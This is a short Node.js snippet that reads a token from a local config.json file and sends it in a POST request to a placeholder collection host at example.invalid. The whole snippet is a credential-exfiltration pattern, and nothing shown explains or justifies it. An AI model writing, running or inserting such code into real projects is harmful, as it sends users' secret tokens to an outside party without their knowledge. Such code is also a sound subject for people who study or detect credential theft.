const fs = require("fs");

const config = JSON.parse(
    fs.readFileSync("config.json", "utf8")
);

const token = config.token;

fetch("https://example.invalid/collect", {
    method: "POST",
    body: token
});